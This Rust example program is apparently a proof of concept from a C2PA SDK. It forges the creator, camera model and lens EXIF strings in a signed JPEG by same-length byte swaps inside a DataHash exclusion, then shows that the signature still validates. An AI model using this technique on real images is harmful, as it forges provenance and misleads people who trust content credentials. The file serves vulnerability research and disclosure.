// Verify that the EXIF metadata inside a DataHash exclusion really is
// unprotected -- by rewriting the camera/author fields the verifier proudly
// displays, without invalidating the C2PA signature.
//
// Hard-coded for the finding `analyze_exclusion_content` reports for
// `attack_assets/horshack.jpg`:
//
//   === sdk/examples/attack_assets/horshack.jpg ===
//     file size: 1913603 bytes
//     exclusion #1: bytes [0..103426) (103426 bytes)
//       -> SOI -- entire segment
//       -> APP1/EXIF metadata -- entire segment
//          EXIF strings: NIKON CORPORATION, NIKON Z6_3, Horshack,
//                        NIKKOR Z 50mm f/1.8 S, ...
//       -> APP1/XMP metadata -- entire segment
//       -> APP2/MPF (multi-picture) -- entire segment
//
// The signer left the entire APP1/EXIF block outside the data hash, so every
// field the C2PA verifier surfaces from it --
//
//     Creator       Horshack
//     Capture date  Sep 3, 2025 ...
//     <model>       Z6_3
//     <lens>        NIKKOR Z 50mm f/1.8 S
//     ISO 100  50mm  f/8.0  1/8000 s
//
// -- is attacker-controllable.  This example flips three of those strings to
// false values *in place*.  Each replacement is exactly the same byte length
// as the original (the trailing EXIF NUL terminator is preserved), so no IFD
// offset or segment length has to be recomputed -- it's a true byte-for-byte
// swap inside the excluded range.  After tampering, `c2pa::Reader` still
// reports the same validation state: the hard binding never covered these
// bytes.
//
// Steps:
//   1. Read the source file.
//   2. For each edit, sanity-check that the bytes at the hard-coded offset
//      still match the expected original (guards against the asset changing).
//   3. Validate the source through `c2pa::Reader` and print its state.
//   4. Apply every edit, write the tampered copy, and validate it.
//   5. Diff the two states side-by-side.
//
// Usage:
//   cargo run --release -p c2pa --example tamper_excluded_exif --features file_io
//
// (no arguments -- everything is hard-coded for horshack.jpg)

use std::{fs, io::Cursor, path::PathBuf};

use anyhow::{bail, Result};
use c2pa::Reader;

const SOURCE: &str = "sdk/examples/attack_assets/horshack.jpg";
const TAMPERED: &str = "sdk/examples/attack_assets/horshack_exif_tampered.jpg";

/// One in-place EXIF string edit.  `offset` is the absolute byte position of
/// the first byte of the value; `expected` and `replacement` must be the same
/// length so the surrounding EXIF structure (and the NUL terminator that
/// follows) stays byte-for-byte intact.
struct Edit {
    label: &'static str,
    offset: usize,
    expected: &'static [u8],
    replacement: &'static [u8],
}

const EDITS: &[Edit] = &[
    Edit {
        label: "Creator (EXIF Artist 0x013B)",
        offset: 268,
        expected: b"Horshack",
        replacement: b"Imposter",
    },
    Edit {
        label: "Camera model (EXIF Model 0x0110)",
        offset: 204,
        expected: b"NIKON Z6_3",
        replacement: b"NIKON Z9_X",
    },
    Edit {
        label: "Lens (EXIF LensModel 0xA434)",
        offset: 1164,
        expected: b"NIKKOR Z 50mm f/1.8 S",
        replacement: b"NIKKOR Z 14mm f/2.8 S",
    },
];

fn main() -> Result<()> {
    // ---- 1. Read source ----
    let source_path = PathBuf::from(SOURCE);
    let original = fs::read(&source_path)?;
    println!("== source: {} ==", source_path.display());
    println!("  file size: {} bytes\n", original.len());

    // ---- 2. Sanity-check every target window ----
    for edit in EDITS {
        let end = edit.offset + edit.expected.len();
        if original.len() < end {
            bail!("source is shorter than {end} bytes (edit {:?})", edit.label);
        }
        if edit.replacement.len() != edit.expected.len() {
            bail!(
                "edit {:?}: replacement is {} bytes but original is {} bytes -- \
                 must match exactly for a byte-for-byte swap",
                edit.label,
                edit.replacement.len(),
                edit.expected.len()
            );
        }
        let window = &original[edit.offset..end];
        println!("  {}", edit.label);
        println!(
            "    bytes [{}..{}) ({} bytes)",
            edit.offset,
            end,
            edit.expected.len()
        );
        println!("    before = {:?}", String::from_utf8_lossy(window));
        if window != edit.expected {
            bail!(
                "edit {:?}: source window does not match expected {:?} -- \
                 did the asset change?  Got {:?}",
                edit.label,
                String::from_utf8_lossy(edit.expected),
                String::from_utf8_lossy(window)
            );
        }
        println!("    after  = {:?}", String::from_utf8_lossy(edit.replacement));
    }

    // ---- 3. Validate the source ----
    let source_state = validate(&original)?;
    println!("\n  c2pa validation_state (source)   = {source_state}");

    // ---- 4. Apply edits, write tampered copy, validate ----
    let mut tampered = original.clone();
    for edit in EDITS {
        let end = edit.offset + edit.expected.len();
        tampered[edit.offset..end].copy_from_slice(edit.replacement);
    }
    fs::write(TAMPERED, &tampered)?;
    println!("\n== tampered: {TAMPERED} ==");

    let tampered_state = validate(&tampered)?;
    println!("  c2pa validation_state (tampered) = {tampered_state}");

    // ---- 5. Side-by-side comparison ----
    println!("\n== summary ==");
    for edit in EDITS {
        println!(
            "  {:<34} {:?} -> {:?}",
            edit.label,
            String::from_utf8_lossy(edit.expected),
            String::from_utf8_lossy(edit.replacement)
        );
    }
    println!("  source   validation_state = {source_state}");
    println!("  tampered validation_state = {tampered_state}");
    if source_state == tampered_state {
        println!(
            "\n  -> validation state is UNCHANGED after rewriting the EXIF strings \
             inside the DataHash exclusion: the camera/author metadata the \
             verifier displays is outside the hard binding and can be forged \
             without breaking the C2PA signature."
        );
    } else {
        println!(
            "\n  -> validation state CHANGED after tampering -- these bytes were \
             not actually outside the hash."
        );
    }

    Ok(())
}

fn validate(bytes: &[u8]) -> Result<String> {
    let mut cursor = Cursor::new(bytes);
    let reader = Reader::from_stream("image/jpeg", &mut cursor)?;
    Ok(format!("{:?}", reader.validation_state()))
}
